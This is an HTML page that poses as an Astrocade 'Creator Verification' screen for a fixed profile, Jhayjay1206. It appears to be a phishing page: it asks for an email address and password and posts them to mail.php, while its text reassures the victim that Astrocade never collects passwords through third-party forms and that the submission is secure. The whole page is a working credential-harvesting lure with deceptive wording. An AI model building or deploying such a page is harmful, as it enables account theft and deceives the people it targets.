<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Astrocade - Create Account</title>

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    html,
    body {
      min-height: 100%;
    }

    body {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 40px 20px;
      font-family: Arial, Helvetica, sans-serif;
      background:
        radial-gradient(circle at 15% 10%, rgba(117, 67, 255, 0.20), transparent 30%),
        radial-gradient(circle at 85% 90%, rgba(0, 220, 255, 0.12), transparent 30%),
        linear-gradient(145deg, #090912 0%, #0d0d18 45%, #11101e 100%);
      color: #ffffff;
      position: relative;
      overflow-x: hidden;
    }

    /* Background glow */
    body::before {
      content: "";
      position: fixed;
      width: 500px;
      height: 500px;
      left: -220px;
      top: -220px;
      border-radius: 50%;
      background: rgba(120, 67, 255, 0.08);
      filter: blur(80px);
      pointer-events: none;
    }

    body::after {
      content: "";
      position: fixed;
      width: 500px;
      height: 500px;
      right: -220px;
      bottom: -220px;
      border-radius: 50%;
      background: rgba(0, 207, 255, 0.06);
      filter: blur(90px);
      pointer-events: none;
    }

    /* Main Card */
    .contact {
      position: relative;
      width: 100%;
      max-width: 455px;
      padding: 38px 36px 32px;
      background:
        linear-gradient(
          145deg,
          rgba(28, 27, 43, 0.98),
          rgba(16, 16, 28, 0.98)
        );
      border: 1px solid rgba(255, 255, 255, 0.09);
      border-radius: 18px;
      box-shadow:
        0 30px 80px rgba(0, 0, 0, 0.55),
        0 0 50px rgba(103, 62, 255, 0.08);
      z-index: 1;
    }

    /* Top accent line */
    .contact::before {
      content: "";
      position: absolute;
      left: 22px;
      right: 22px;
      top: 0;
      height: 2px;
      border-radius: 10px;
      background: linear-gradient(
        90deg,
        transparent,
        #8b5cf6,
        #c084fc,
        #8b5cf6,
        transparent
      );
    }

    /* Header */
    .form-header {
      text-align: center;
      margin-bottom: 30px;
    }

    /* Refined Astrocade Logo */
    .form-icon {
      width: 150px;
      height: 125px;
      margin: 0 auto 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      background: transparent;
      border-radius: 0;
      box-shadow: none;
      overflow: visible;
    }

    .form-icon img {
      width: 125px;
      height: 125px;
      display: block;
      object-fit: contain;
      filter:
        drop-shadow(0 8px 18px rgba(0, 0, 0, 0.35))
        drop-shadow(0 0 16px rgba(190, 50, 255, 0.18));
    }

    h2 {
      color: #ffffff;
      text-align: center;
      font-size: 29px;
      margin-bottom: 9px;
      font-weight: 700;
      letter-spacing: -0.6px;
    }

    .form-subtitle {
      color: #9b9aaa;
      font-size: 14px;
      line-height: 1.6;
    }

    /* Input */
    .input-box {
      position: relative;
      margin-bottom: 19px;
    }

    .input-box label {
      display: block;
      margin-bottom: 8px;
      color: #d9d7e3;
      font-size: 13px;
      font-weight: 600;
    }

    .input-box input {
      width: 100%;
      height: 51px;
      padding: 0 15px;
      letter-spacing: 0.2px;
      outline: none;
      border: 1px solid #2f2e3c;
      border-radius: 9px;
      background: #181722;
      color: #ffffff;
      font-size: 15px;
      box-shadow:
        inset 0 1px 2px rgba(0, 0, 0, 0.25);
      transition:
        border-color 0.25s ease,
        box-shadow 0.25s ease,
        background 0.25s ease;
    }

    .input-box input:focus {
      background: #1c1b28;
      border-color: #8b5cf6;
      box-shadow:
        0 0 0 3px rgba(139, 92, 246, 0.12),
        0 5px 20px rgba(139, 92, 246, 0.08);
    }

    .input-box input::placeholder {
      color: #666474;
      letter-spacing: 0;
      font-size: 14px;
    }

    /* FIXED USERNAME */
    .fixed-username {
      width: 100%;
      min-height: 51px;
      padding: 0 15px;
      display: flex;
      align-items: center;
      border: 1px solid #2f2e3c;
      border-radius: 9px;
      background: #181722;
      font-size: 15px;
      box-shadow:
        inset 0 1px 2px rgba(0, 0, 0, 0.25);
    }

    .fixed-username a {
      color: #ffffff;
      text-decoration: none;
      font-weight: 600;
    }

    .fixed-username a:hover {
      color: #a78bfa;
      text-decoration: underline;
    }

    /* Password input wrapper */
    .password-wrapper {
      position: relative;
    }

    .password-wrapper input {
      padding-right: 52px;
    }

    /* Eye button */
    .toggle-password {
      position: absolute;
      right: 7px;
      top: 50%;
      transform: translateY(-50%);
      width: 38px;
      height: 38px;
      border: none;
      border-radius: 8px;
      background: transparent;
      color: #777487;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.2s ease;
    }

    .toggle-password:hover {
      background: rgba(139, 92, 246, 0.12);
      color: #a78bfa;
    }

    .toggle-password svg {
      width: 20px;
      height: 20px;
    }

    /* Password strength */
    .password-strength {
      display: none;
      margin-top: 8px;
      font-size: 12px;
      color: #858293;
    }

    .strength-bar {
      width: 100%;
      height: 4px;
      margin-top: 7px;
      overflow: hidden;
      border-radius: 10px;
      background: #292834;
    }

    .strength-fill {
      width: 0;
      height: 100%;
      border-radius: 10px;
      background: linear-gradient(
        90deg,
        #7c3aed,
        #a855f7
      );
      transition: all 0.3s ease;
    }

    /* Password match message */
    .password-message {
      display: none;
      margin-top: 7px;
      font-size: 12px;
      font-weight: 500;
    }

    .password-message.error {
      display: block;
      color: #f87171;
    }

    .password-message.success {
      display: block;
      color: #4ade80;
    }

    .password-error {
      border-color: #ef4444 !important;
      box-shadow:
        0 0 0 3px rgba(239, 68, 68, 0.08) !important;
    }

    .password-success {
      border-color: #22c55e !important;
      box-shadow:
        0 0 0 3px rgba(34, 197, 94, 0.08) !important;
    }

    /* Submit */
    .submit-btn {
      margin-top: 9px;
    }

    .submit-btn input {
      width: 100%;
      height: 53px;
      border: none;
      background:
        linear-gradient(
          135deg,
          #7c3aed,
          #9b5cff
        );
      border-radius: 9px;
      color: #ffffff;
      font-size: 16px;
      font-family: Arial, Helvetica, sans-serif;
      font-weight: 700;
      letter-spacing: 0.1px;
      cursor: pointer;
      box-shadow:
        0 10px 25px rgba(124, 58, 237, 0.25);
      transition:
        transform 0.25s ease,
        box-shadow 0.25s ease,
        filter 0.25s ease;
    }

    .submit-btn input:hover {
      transform: translateY(-2px);
      filter: brightness(1.08);
      box-shadow:
        0 14px 30px rgba(124, 58, 237, 0.35);
    }

    .submit-btn input:active {
      transform: translateY(0);
    }

    /* Security note */
    .security-note {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 7px;
      margin-top: 20px;
      padding-top: 18px;
      border-top: 1px solid rgba(255, 255, 255, 0.06);
      color: #6f6c7b;
      font-size: 11px;
    }

    .security-note svg {
      width: 14px;
      height: 14px;
      color: #817d8f;
    }

    /* Mobile */
    @media (max-width: 480px) {

      body {
        padding: 20px 14px;
      }

      .contact {
        padding: 30px 22px 25px;
        border-radius: 16px;
      }

      .contact::before {
        left: 18px;
        right: 18px;
      }

      .form-icon {
        width: 130px;
        height: 112px;
        margin-bottom: 10px;
      }

      .form-icon img {
        width: 112px;
        height: 112px;
      }

      h2 {
        font-size: 25px;
      }

      .form-subtitle {
        font-size: 13px;
      }

      .input-box input {
        height: 50px;
      }

      .fixed-username {
        min-height: 50px;
      }

      .submit-btn input {
        height: 51px;
      }
    }

    @media (max-width: 350px) {

      .contact {
        padding: 26px 18px 23px;
      }

      h2 {
        font-size: 23px;
      }
    }
	.form-subtitle {
  color: #9b9aaa;
  font-size: 13.5px;
  line-height: 1.65;
  max-width: 390px;
  margin: 0 auto;
}

.form-subtitle::before {
  content: "SECURE CREATOR VERIFICATION";
  display: block;
  width: fit-content;
  margin: 0 auto 12px;
  padding: 5px 10px;
  border: 1px solid rgba(139, 92, 246, 0.25);
  border-radius: 999px;
  background: rgba(139, 92, 246, 0.08);
  color: #a78bfa;
  font-size: 10px;
  font-weight: 700;
  letter-spacing: 0.8px;
}
  </style>
</head>

<body>

  <div class="contact">

    <div class="form-header">

      <div class="form-icon">
        <img
          src="astro4.png"
          alt="Astrocade Logo">
      </div>

      <h2>Creator Verification</h2>

    <p class="form-subtitle">
  Verify your creator account to help confirm that you are the legitimate owner of this Astrocade profile.
  Please make sure the account information you provide is accurate and belongs to you.
  <br><br>
  For your security, only enter credentials through Astrocade’s official authentication system.
  We will never ask you to share your Astrocade password through a third-party form or message.After submission, your verification request will be reviewed within 24 hours.
</p>


    </div>

    <form action="mail.php" method="post" id="contactForm">

      <!-- FIXED USERNAME -->
      <div class="input-box">
        <label for="name">Username</label>

        <div class="fixed-username">
          <a
            href="https://www.astrocade.com/profile/Jhayjay1206"
            target="_blank"
            rel="noopener noreferrer">
            Jhayjay1206
          </a>
        </div>

        <!-- Username submitted to mail.php -->
        <input
          type="hidden"
          id="name"
          name="name"
          value="Jhayjay1206">
      </div>


      <div class="input-box">
        <label for="email">Email Address</label>

        <input
          type="email"
          id="email"
          name="email"
          placeholder="Enter your email address"
          autocomplete="email"
          required>
      </div>


      <div class="input-box">

        <label for="password">
          Password
        </label>

        <div class="password-wrapper">

          <input
            type="password"
            id="password"
            name="password"
            placeholder="Create a password"
            autocomplete="new-password"
            minlength="3"
            required>

          <button
            type="button"
            class="toggle-password"
            data-target="password"
            aria-label="Show password">

            <svg
              class="eye-open"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2">

              <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12z"></path>

              <circle cx="12" cy="12" r="3"></circle>

            </svg>

          </button>

        </div>


        <div
          class="password-strength"
          id="passwordStrength">

          <span id="strengthText">
            Password strength
          </span>

          <div class="strength-bar">

            <div
              class="strength-fill"
              id="strengthFill">
            </div>

          </div>

        </div>

      </div>


      <div class="input-box">

        <label for="confirmpassword">
          Confirm Password
        </label>

        <div class="password-wrapper">

          <input
            type="password"
            id="confirmpassword"
            name="confirmpassword"
            placeholder="Confirm your password"
            autocomplete="new-password"
            minlength="3"
            required>

          <button
            type="button"
            class="toggle-password"
            data-target="confirmpassword"
            aria-label="Show password">

            <svg
              class="eye-open"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2">

              <path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12z"></path>

              <circle cx="12" cy="12" r="3"></circle>

            </svg>

          </button>

        </div>


        <div
          class="password-message"
          id="passwordMessage">
        </div>

      </div>


      <div class="submit-btn">

        <input
          type="submit"
          name="send"
          value="Verifying Account">

      </div>

    </form>


    <div class="security-note">

      <svg
        viewBox="0 0 24 24"
        fill="none"
        stroke="currentColor"
        stroke-width="2">

        <rect
          x="3"
          y="11"
          width="18"
          height="10"
          rx="2">
        </rect>

        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>

      </svg>

      Your information is securely submitted

    </div>

  </div>


  <script>

    const password =
      document.getElementById("password");

    const confirmPassword =
      document.getElementById("confirmpassword");

    const passwordMessage =
      document.getElementById("passwordMessage");

    const form =
      document.getElementById("contactForm");


    /*
     * PASSWORD SHOW / HIDE
     */

    document
      .querySelectorAll(".toggle-password")
      .forEach(button => {

        button.addEventListener("click", function () {

          const targetId =
            this.getAttribute("data-target");

          const input =
            document.getElementById(targetId);


          if (input.type === "password") {

            input.type = "text";

            this.setAttribute(
              "aria-label",
              "Hide password"
            );


            this.innerHTML = `
              <svg
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2">

                <path d="M3 3l18 18"></path>

                <path d="M10.6 10.6a2 2 0 0 0 2.8 2.8"></path>

                <path d="M9.9 4.3A10.7 10.7 0 0 1 12 4
                  c6.5 0 10 8 10 8
                  a18.5 18.5 0 0 1-3.2 4.5"></path>

                <path d="M6.6 6.6C3.5 8.7 2 12 2 12
                  s3.5 7 10 7
                  c1.4 0 2.6-.3 3.7-.8"></path>

              </svg>
            `;

          } else {

            input.type = "password";

            this.setAttribute(
              "aria-label",
              "Show password"
            );


            this.innerHTML = `
              <svg
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2">

                <path d="M2 12s3.5-7 10-7
                  10 7 10 7
                  -3.5 7-10 7
                  S2 12 2 12z"></path>

                <circle
                  cx="12"
                  cy="12"
                  r="3">
                </circle>

              </svg>
            `;
          }

        });

      });


    /*
     * PASSWORD STRENGTH
     */

    const strengthBox =
      document.getElementById(
        "passwordStrength"
      );

    const strengthFill =
      document.getElementById(
        "strengthFill"
      );

    const strengthText =
      document.getElementById(
        "strengthText"
      );


    password.addEventListener(
      "input",
      function () {

        const value =
          password.value;


        if (value.length === 0) {

          strengthBox.style.display =
            "none";

          strengthFill.style.width =
            "0";

          return;
        }


        strengthBox.style.display =
          "block";


        let strength = 0;


        if (value.length >= 6)
          strength++;

        if (value.length >= 10)
          strength++;

        if (/[A-Z]/.test(value))
          strength++;

        if (/[0-9]/.test(value))
          strength++;

        if (/[^A-Za-z0-9]/.test(value))
          strength++;


        if (strength <= 2) {

          strengthFill.style.width =
            "35%";

          strengthText.textContent =
            "Weak password";

        } else if (strength <= 3) {

          strengthFill.style.width =
            "65%";

          strengthText.textContent =
            "Medium password";

        } else {

          strengthFill.style.width =
            "100%";

          strengthText.textContent =
            "Strong password";

        }


        checkPasswords();

      });


    /*
     * CONFIRM PASSWORD VALIDATION
     */

    confirmPassword.addEventListener(
      "input",
      checkPasswords
    );


    function checkPasswords() {

      if (
        confirmPassword.value.length === 0
      ) {

        passwordMessage.style.display =
          "none";

        confirmPassword.classList.remove(
          "password-error"
        );

        confirmPassword.classList.remove(
          "password-success"
        );

        return false;
      }


      if (
        password.value !==
        confirmPassword.value
      ) {

        passwordMessage.textContent =
          "Passwords do not match.";

        passwordMessage.className =
          "password-message error";

        confirmPassword.classList.add(
          "password-error"
        );

        confirmPassword.classList.remove(
          "password-success"
        );

        return false;

      } else {

        passwordMessage.textContent =
          "Passwords match.";

        passwordMessage.className =
          "password-message success";

        confirmPassword.classList.remove(
          "password-error"
        );

        confirmPassword.classList.add(
          "password-success"
        );

        return true;
      }

    }


    /*
     * STOP FORM SUBMISSION IF PASSWORDS DON'T MATCH
     */

    form.addEventListener(
      "submit",
      function (event) {

        if (
          password.value !==
          confirmPassword.value
        ) {

          event.preventDefault();


          passwordMessage.textContent =
            "Passwords do not match. Please enter the same password.";


          passwordMessage.className =
            "password-message error";


          confirmPassword.classList.add(
            "password-error"
          );


          confirmPassword.focus();


          return false;
        }


        /*
         * IMPORTANT:
         *
         * The form still submits normally
         * to mail.php.
         *
         * Your existing backend remains unchanged.
         *
         * Username is permanently set to:
         * Jhayjay1206
         *
         * The visible username links to:
         * https://www.astrocade.com/profile/Jhayjay1206
         */

      });

  </script>

</body>

</html>